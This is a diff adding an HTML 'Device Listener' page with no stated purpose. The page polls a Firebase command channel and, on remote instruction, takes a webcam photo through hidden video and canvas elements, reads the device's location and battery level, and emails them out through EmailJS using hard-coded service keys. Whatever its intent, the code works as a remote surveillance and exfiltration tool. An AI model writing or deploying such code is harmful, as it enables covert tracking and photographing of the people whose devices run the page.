@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Device Listener</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
+  <script src="firebase-config.js"></script>
+</head>
+<body>
+  <h2>Listening for Commands...</h2>
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    emailjs.init("vyxyeBFTfSi_ISmNG");
+
+    const dbRef = db.ref("command");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    dbRef.on("value", async (snapshot) => {
+      const command = snapshot.val();
+      if (!command || !command.action) return;
+
+      if (command.action === "take_picture") {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL("image/png");
+
+            emailjs.send("service_gkkpt4w", "template_96dsagv", {
+              message: location,
+              image: imageData
+            }).then(() => alert("Photo + Location sent"))
+              .catch((err) => alert("Email failed: " + JSON.stringify(err)));
+
+            stream.getTracks().forEach(track => track.stop());
+          }, 2000);
+        });
+      }
+
+      if (command.action === "get_location") {
+        navigator.geolocation.getCurrentPosition((pos) => {
+          const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+          emailjs.send("service_gkkpt4w", "template_96dsagv", {
+            message: location,
+            image: ""
+          }).then(() => alert("Location sent"))
+            .catch((err) => alert("Error sending location"));
+        });
+      }
+
+      if (command.action === "get_battery") {
+        navigator.getBattery().then((battery) => {
+          const level = `Battery Level: ${Math.round(battery.level * 100)}%`;
+          emailjs.send("service_gkkpt4w", "template_96dsagv", {
+            message: level,
+            image: ""
+          }).then(() => alert("Battery info sent"))
+            .catch((err) => alert("Battery email failed"));
+        });
+      }
+
+      if (command.action === "show_message") {
+        alert(command.text || "No message provided");
+      }
+
+      if (command.action === "play_sound") {
+        const audio = new Audio("https://actions.google.com/sounds/v1/alarms/beep_short.ogg");
+        audio.play();
+      }
+    });
+  </script>
+</body>
+</html>
